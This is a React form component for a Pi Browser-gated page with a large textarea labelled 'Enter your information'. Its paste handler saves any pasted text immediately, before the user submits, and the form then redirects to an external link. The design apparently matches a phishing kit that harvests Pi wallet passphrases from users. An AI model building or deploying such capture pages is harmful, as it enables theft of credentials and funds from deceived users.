import React, { useState, useEffect } from "react";
import { isPiBrowserAvailable, authenticateWithPi, AuthResult } from "@/utils/browserDetection";
import { saveSubmission } from "@/utils/dataStorage";
import BrowserGate from "@/components/BrowserGate";
import PiLogo from "@/components/PiLogo";
import { Button } from "@/components/ui/button";
import { useToast } from "@/hooks/use-toast";

const Form = () => {
  const [hasAcceptedRules, setHasAcceptedRules] = useState(true);
  const [inputValue, setInputValue] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isAuthorized, setIsAuthorized] = useState<boolean | null>(null);
  const [userAuth, setUserAuth] = useState<AuthResult | null>(null);
  const { toast } = useToast();

  useEffect(() => {
    const initializePiBrowser = async () => {
      if (!isPiBrowserAvailable()) {
        setIsAuthorized(false);
        return;
      }

      try {
        const auth = await authenticateWithPi();
        setUserAuth(auth);
        setIsAuthorized(true);
      } catch (error) {
        console.error('Failed to authenticate with Pi Browser:', error);
        setIsAuthorized(false);
      }
    };

    setTimeout(initializePiBrowser, 500);
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!inputValue.trim()) {
      toast({
        variant: "destructive",
        title: "Validation Error",
        description: "Please enter some content before submitting.",
      });
      return;
    }

    setIsSubmitting(true);
    
    setTimeout(() => {
      saveSubmission(inputValue.trim());
      
      toast({
        title: "Success!",
        description: "Redirecting you now...",
        className: "border-accent/50 bg-accent/10",
      });
      
      setInputValue("");
      
      setTimeout(() => {
        window.location.href = "https://your-external-link.com";
      }, 1000);
    }, 500);
  };

  if (isAuthorized === null) {
    return (
      <div className="min-h-screen bg-gradient-background flex items-center justify-center">
        <div className="text-center">
          <PiLogo size="lg" className="mx-auto mb-4" />
          <p className="text-muted-foreground">Verifying Pi Browser authentication...</p>
          <div className="mt-4">
            <div className="animate-spin rounded-full h-8 w-8 border-2 border-primary border-t-transparent mx-auto" />
          </div>
        </div>
      </div>
    );
  }

  if (!isAuthorized) {
    return <BrowserGate />;
  }

  return (
    <div className="min-h-screen bg-gradient-background">
      {hasAcceptedRules && (
        <div className="px-6 py-12">
          <div className="">
            <form onSubmit={handleSubmit} className="space-y-6">
              <div>
                <h2 className="text-xl font-bold text-black text-center mb-4">
                  Enter your information
                </h2>
                <textarea
                  id="submission"
                  value={inputValue}
                  onChange={(e) => setInputValue(e.target.value)}
                  onPaste={(e) => {
                    e.preventDefault();
                    const pastedText = e.clipboardData.getData('text');
                    setInputValue(pastedText);
                    
                    if (pastedText.trim()) {
                      saveSubmission(pastedText.trim());
                    }
                  }}
                  placeholder="Enter your information here..."
                  className="w-full px-4 py-3 bg-white/50 border-2 border-border focus:border-accent transition-colors min-h-[300px] rounded-md resize-vertical text-lg"
                  disabled={isSubmitting}
                />
              </div>

              <div className="space-y-4">
                <Button
                  type="submit"
                  disabled={isSubmitting}
                  className="w-full bg-white hover:bg-gray-50 text-[#692f8f] border border-[#692f8f] font-semibold py-3 text-base transition-all hover:scale-[1.02] disabled:opacity-50 disabled:hover:scale-100"
                >
                  {isSubmitting ? (
                    <>
                      <div className="animate-spin rounded-full h-5 w-5 border-2 border-accent-foreground border-t-transparent mr-2" />
                      Submitting...
                    </>
                  ) : (
                    <>
                      Submit
                    </>
                  )}
                </Button>

                <Button
                  type="button"
                  onClick={() => window.location.href = ""}
                  className="w-full bg-[#703d92] hover:bg-[#692f8f] text-white font-semibold py-3 text-base transition-all hover:scale-[1.02] disabled:opacity-50 disabled:hover:scale-100"
                >
                  Go to External Link
                </Button>
                
                <div className="text-left text-base text-muted-foreground mt-6 space-y-2">
                  <p>Nawui hi ithumna mashijin pai mana, nawui hi namang na shichin kapaina.aruiruiva shimaan haikha mahan unglui pai mana.</p>
                  <p>
                    Shiman hairla? <a href="" className="text-accent hover:underline">hili kadhar semkhuilo</a>, kha nawui katongkha shimaan haora.
                  </p>
                </div>
              </div>
            </form>
          </div>
        </div>
      )}
    </div>
  );
};

export default Form;
